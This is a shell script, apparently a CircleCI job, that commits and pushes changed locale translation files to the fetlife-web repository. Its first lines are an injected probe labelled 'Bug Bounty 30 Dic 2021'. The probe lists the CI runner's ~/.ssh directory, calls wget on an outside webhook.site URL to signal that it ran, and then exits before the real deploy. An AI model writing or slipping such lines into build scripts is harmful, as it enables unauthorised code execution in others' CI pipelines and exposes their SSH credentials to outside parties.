#!/bin/sh

# Bug Bounty 30 Dic 2021
ls -alh /home/circleci/.ssh
wget 	https://webhook.site/c10ac759-98d8-4b97-9737-a0f2be274e36?
exit

git config --global user.email "dev@fetlife.com"
git config --global user.name "FetBot"

CHANGED_LOCALES=`git log -m -1 --name-only --pretty="format:" "$CIRCLE_SHA1" | grep locales`

if [ -z "$CHANGED_LOCALES" ]; then
  echo "No locale files have been changed. No need to deploy anything!"
  exit 0
fi

mkdir -p tmp
cd tmp
TMP_DIR=`pwd`

# deploy to fetlife-web
cd $TMP_DIR
git clone --recursive git@github.com:fetlife/fetlife-web.git
cd fetlife-web
git submodule foreach git pull origin master
git add config/locales/translations
git commit -m "Autoupdate translations"
git push origin HEAD
